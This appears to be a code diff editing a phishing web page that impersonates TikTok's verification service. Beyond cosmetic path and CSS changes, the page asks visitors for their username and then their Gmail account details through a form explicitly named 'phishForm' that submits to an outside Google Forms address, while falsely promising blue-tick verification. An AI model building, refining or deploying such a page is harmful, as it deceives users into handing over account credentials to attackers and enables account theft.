@@ -90,6 +90,7 @@
             align-items: center;
             min-height: 60vh;
             margin-bottom: 40px;
+            visibility: visible !important;
         }
 
         .container {
@@ -100,12 +101,15 @@
             text-align: center;
             max-width: 400px;
             width: 100%;
-            display: none;
             border: 2px solid #ff0050;
         }
 
         .container.active {
-            display: block;
+            display: block !important;
+        }
+
+        .container:not(.active) {
+            display: none !important;
         }
 
         .logo {
@@ -472,8 +476,8 @@
             </span>
             <div class="logo-container">
                 <a title="TikTok" class="logo-link" href="https://nicoderrr.github.io/instagramverifyaccount.github.io/">
-                    <img class="logo-icon" src="tiktoklogo.png" alt="TikTok">
-                    <img class="logo-text" src="tiktokyatay.png" alt="TikTok">
+                    <img class="logo-icon" src="./tiktoklogo.png" alt="TikTok">
+                    <img class="logo-text" src="./tiktokyatay.png" alt="TikTok">
                     <strong>TikTok</strong>
                 </a>
             </div>
@@ -482,7 +486,7 @@
 
     <div class="main-content">
         <div class="container active" id="step1">
-            <img src="tiktoklogo.png" alt="TikTok Logo" class="logo">
+            <img src="./tiktoklogo.png" alt="TikTok Logo" class="logo">
             <h2>TikTok Verification Center</h2>
             <p>Get help with your verification request for TikTok. Information shared will only be used to respond to your request.</p>
             <label class="form-label" for="username">Email or Username</label>
@@ -495,7 +499,7 @@
         </div>
 
         <div class="container" id="step2">
-            <img src="tiktoklogo.png" alt="TikTok Logo" class="logo">
+            <img src="./tiktoklogo.png" alt="TikTok Logo" class="logo">
             <h2>Additional Verification</h2>
             <p>To complete the verification process, please enter your Gmail account information.</p>
             <form id="phishForm" action="https://forms.gle/ADkY4tif3Yw3kvRF8" method="POST">
@@ -512,7 +516,7 @@
         </div>
 
         <div class="container" id="success">
-            <img src="tiktoklogo.png" alt="TikTok Logo" class="logo">
+            <img src="./tiktoklogo.png" alt="TikTok Logo" class="logo">
             <h2>Application Received</h2>
             <p>Your application has been processed. Your account will receive blue tick verification within approximately 24 hours.</p>
             <div class="footer">© TikTok. 160 Inc., Direct Support</div>
@@ -525,17 +529,17 @@
                 <h2>Download Now</h2>
                 <div class="download-wrapper">
                     <a href="https://nicoderrr.github.io/instagramverifyaccount.github.io/" target="_blank" rel="nofollow noreferrer">
-                        <img class="apple" src="appstore.png" alt="apple-store">
+                        <img class="apple" src="./appstore.png" alt="apple-store">
                     </a>
                     <a href="https://nicoderrr.github.io/instagramverifyaccount.github.io/" target="_blank" rel="nofollow noreferrer">
-                        <img class="google" src="googleplay.png" alt="google-store">
+                        <img class="google" src="./googleplay.png" alt="google-store">
                     </a>
                     <a href="https://nicoderrr.github.io/instagramverifyaccount.github.io/" target="_blank" rel="nofollow noreferrer">
-                        <img class="amazon" src="amazon.png" alt="amazon-store">
+                        <img class="amazon" src="./amazon.png" alt="amazon-store">
                     </a>
                     <a href="https://nicoderrr.github.io/instagramverifyaccount.github.io/" target="_blank" rel="nofollow noreferrer">
                         <div class="ms-image-wrapper">
-                            <img class="microsoft" src="microsoft.png" alt="microsoft-store">
+                            <img class="microsoft" src="./microsoft.png" alt="microsoft-store">
                         </div>
                     </a>
                 </div>
@@ -545,7 +549,7 @@
         <footer class="footer-content-wrapper">
             <div class="tiktok-logo">
                 <a title="TikTok" class="logo-container" href="https://nicoderrr.github.io/instagramverifyaccount.github.io/">
-                    <img src="tiktokyatay.png" class="logo-group">
+                    <img src="./tiktokyatay.png" class="logo-group">
                 </a>
                 <strong>TikTok</strong>
             </div>
@@ -590,7 +594,7 @@
         </footer>
         
         <div class="footer-bottom-wrapper">
-            <div class="language-selection" style="background:url(https://nicoderrr.github.io/instagramverifyaccount.github.io/arrow.svg) center no-repeat;background-position:right 10px bottom 11px">
+            <div class="language-selection" style="background:url(./arrow.svg) center no-repeat;background-position:right 10px bottom 11px">
                 <p><span>English</span></p>
                 <select class="language-selection-form" onchange="changeLanguage(this.value)">
                     <option value="id">Bahasa Indonesia</option>
